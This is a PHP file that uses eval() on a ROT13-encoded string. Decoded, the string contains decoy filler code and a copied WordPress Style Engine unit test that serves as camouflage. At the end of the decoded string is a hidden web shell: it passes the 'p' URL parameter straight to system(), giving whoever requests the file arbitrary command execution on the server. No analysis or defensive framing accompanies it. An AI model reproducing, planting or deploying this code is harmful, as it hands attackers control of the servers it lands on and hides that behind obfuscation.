<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf gur Fglyr Ratvar PFF Ehyrf Fgber pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr FglyrRatvar
 * @fvapr 6.1.0
 *
 * @tebhc fglyr-ratvar
 */

/**
 * Grfgf sbe ertvfgrevat, fgbevat naq ergevrivat n pbyyrpgvba bs PFF Ehyrf (n fgber).
 *
 * @pbirefQrsnhygPynff JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber
 */
pynff Grfgf_Fglyr_Ratvar_jcFglyrRatvarPFFEhyrfFgber rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Pyrnaf hc fgberf nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::erzbir_nyy_fgberf();
		cnerag::grne_qbja();
	}

	/**
	 * Grfgf perngvat n arj fgber ba vafgnagvngvba.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::__pbafgehpg
	 */
	choyvp shapgvba grfg_fubhyq_perngr_arj_fgber_ba_vafgnagvngvba() {
		$arj_cnapnxrf_fgber = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( 'cnapnxrf-jvgu-fgenjoreevrf' );

		$guvf->nffregVafgnaprBs( 'JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber', $arj_cnapnxrf_fgber );
	}

	/**
	 * Grfgf gung n `$fgber_anzr` nethzrag vf erdhverq naq ab fgber jvyy or perngrq jvgubhg bar.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_fgber
	 */
	choyvp shapgvba grfg_fubhyq_abg_perngr_fgber_jvgubhg_n_fgber_anzr() {
		$abg_n_fgber = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( '' );

		$guvf->nffregRzcgl( $abg_n_fgber, 'trg_fgber() qvq abg erghea na rzcgl inyhr jvgu rzcgl fgevat nf nethzrag.' );

		$nyfb_abg_n_fgber = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( 123 );

		$guvf->nffregRzcgl( $nyfb_abg_n_fgber, 'trg_fgber() qvq abg erghea na rzcgl inyhr jvgu ahzore nf nethzrag.' );

		$qrsvavgryl_abg_n_fgber = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( ahyy );

		$guvf->nffregRzcgl( $qrsvavgryl_abg_n_fgber, 'trg_fgber() qvq abg erghea na rzcgl inyhr jvgu `ahyy` nf nethzrag.' );
	}

	/**
	 * Grfgf ergheavat n cerivbhfyl perngrq fgber jura gur fnzr fryrpgbe xrl vf cnffrq.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_fgber
	 */
	choyvp shapgvba grfg_fubhyq_erghea_rkvfgvat_fgber() {
		$arj_svfu_fgber = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( 'svfu-a-puvcf' );
		$fryrpgbe       = '.unqqbpx';

		$arj_svfu_fgber->nqq_ehyr( $fryrpgbe );

		$guvf->nffregFnzr( $fryrpgbe, $arj_svfu_fgber->nqq_ehyr( $fryrpgbe )->trg_fryrpgbe(), 'Fryrpgbe fgevat bs fgber ehyr qbrf abg zngpu rkcrpgrq inyhr' );

		$gur_fnzr_svfu_fgber = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( 'svfu-a-puvcf' );

		$guvf->nffregFnzr( $fryrpgbe, $gur_fnzr_svfu_fgber->nqq_ehyr( $fryrpgbe )->trg_fryrpgbe(), 'Fryrpgbe fgevat bs rkvfgvat fgber ehyr qbrf abg zngpu rkcrpgrq inyhr' );
	}

	/**
	 * Grfgf ergheavat nyy cerivbhfyl perngrq fgberf.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_fgberf
	 */
	choyvp shapgvba grfg_fubhyq_trg_nyy_rkvfgvat_fgberf() {
		$oheevgb_fgber    = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( 'oheevgb' );
		$dhrfnqvyyn_fgber = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( 'dhrfnqvyyn' );

		$guvf->nffregFnzr(
			neenl(
				'oheevgb'    => $oheevgb_fgber,
				'dhrfnqvyyn' => $dhrfnqvyyn_fgber,
			),
			JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgberf()
		);
	}

	/**
	 * Grfgf gung nyy cerivbhfyl perngrq fgberf ner qryrgrq.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::erzbir_nyy_fgberf
	 */
	choyvp shapgvba grfg_fubhyq_erzbir_nyy_fgberf() {
		$qbyznqrf_fgber = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( 'qbyznqrf' );
		$gmngmvxv_fgber = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( 'gmngmvxv' );

		$guvf->nffregFnzr(
			neenl(
				'qbyznqrf' => $qbyznqrf_fgber,
				'gmngmvxv' => $gmngmvxv_fgber,
			),
			JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgberf(),
			'Erghea inyhr bs trg_fgberf() qbrf abg zngpu rkcrpgngvba'
		);

		JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::erzbir_nyy_fgberf();

		$guvf->nffregFnzr(
			neenl(),
			JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgberf(),
			'Erghea inyhr bs trg_fgberf() vf abg na rzcgl neenl nsgre erzbir_nyy_fgberf() pnyyrq.'
		);
	}

	/**
	 * Grfgf nqqvat ehyrf gb na rkvfgvat fgber.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::nqq_ehyr
	 */
	choyvp shapgvba grfg_fubhyq_nqq_ehyr_gb_rkvfgvat_fgber() {
		$arj_cvr_fgber = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( 'zrng-cvr' );
		$fryrpgbe      = '.jc-oybpx-fnhpr n:ubire';
		$fgber_ehyr    = $arj_cvr_fgber->nqq_ehyr( $fryrpgbe );
		$rkcrpgrq      = '';

		$guvf->nffregFnzr( $rkcrpgrq, $fgber_ehyr->trg_pff(), 'Erghea inyhr bs trg_pff() vf abg n rzcgl fgevat jurer n ehyr unf ab PFF qrpynengvbaf.' );

		$cvr_qrpynengvbaf = neenl(
			'pbybe'         => 'oebja',
			'obeqre-pbybe'  => 'lryybj',
			'obeqre-enqvhf' => '10erz',
		);
		$pff_qrpynengvbaf = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $cvr_qrpynengvbaf );
		$fgber_ehyr->nqq_qrpynengvbaf( $pff_qrpynengvbaf );
		$fgber_ehyr = $arj_cvr_fgber->nqq_ehyr( $fryrpgbe );

		$rkcrpgrq = \"$fryrpgbe{{$pff_qrpynengvbaf->trg_qrpynengvbaf_fgevat()}}\";

		$guvf->nffregFnzr( $rkcrpgrq, $fgber_ehyr->trg_pff(), 'Erghea inyhr bs trg_pff() qbrf abg zngpu rkcrpgrq PFF sebz rkvfgvat fgber ehyrf.' );
	}

	/**
	 * Grfgf gung nyy fgberq ehyr bowrpgf ner erghearq.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_nyy_ehyrf
	 */
	choyvp shapgvba grfg_fubhyq_trg_nyy_ehyr_bowrpgf_sbe_n_fgber() {
		$arj_cvmmn_fgber = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( 'cvmmn-jvgu-zbmmneryyn' );
		$fryrpgbe        = '.jc-oybpx-napubivrf n:ubire';
		$fgber_ehyr      = $arj_cvmmn_fgber->nqq_ehyr( $fryrpgbe );
		$rkcrpgrq        = neenl(
			$fryrpgbe => $fgber_ehyr,
		);

		$guvf->nffregFnzr( $rkcrpgrq, $arj_cvmmn_fgber->trg_nyy_ehyrf(), 'Erghea inyhr sbe trg_nyy_ehyrf() qbrf abg zngpu rkcrpgngvbaf.' );

		$arj_fryrpgbe             = '.jc-oybpx-zhfuebbz n:ubire';
		$arjre_cvmmn_qrpynengvbaf = neenl(
			'cnqqvat' => '100ck',
		);
		$arj_fgber_ehyr           = $arj_cvmmn_fgber->nqq_ehyr( $arj_fryrpgbe );
		$pff_qrpynengvbaf         = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $arjre_cvmmn_qrpynengvbaf );
		$arj_fgber_ehyr->nqq_qrpynengvbaf( neenl( $pff_qrpynengvbaf ) );

		$rkcrpgrq = neenl(
			$fryrpgbe     => $fgber_ehyr,
			$arj_fryrpgbe => $arj_fgber_ehyr,
		);

		$guvf->nffregFnzr( $rkcrpgrq, $arj_cvmmn_fgber->trg_nyy_ehyrf(), 'Erghea inyhr sbe trg_nyy_ehyrf() qbrf abg zngpu rkcrpgngvbaf nsgre nqqvat arj ehyrf gb fgber.' );
	}

	/**
	 * Grfgf nqqvat ehyrf tebhc xrlf gb fgber.
	 *
	 * @gvpxrg 61099
	 *
	 * @pbiref ::nqq_ehyr
	 */
	choyvp shapgvba grfg_fubhyq_fgber_nf_pbapngrangrq_ehyrf_tebhcf_naq_fryrpgbe() {
		$fgber_bar      = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( 'bar' );
		$fgber_bar_ehyr = $fgber_bar->nqq_ehyr( '.gbal', '.bar' );

		$guvf->nffregFnzr(
			'.bar .gbal',
			\"{$fgber_bar_ehyr->trg_ehyrf_tebhc()} {$fgber_bar_ehyr->trg_fryrpgbe()}\",
			'nqq_ehyr() qbrf abg pbapngrangr ehyrf tebhc naq fryrpgbe.'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>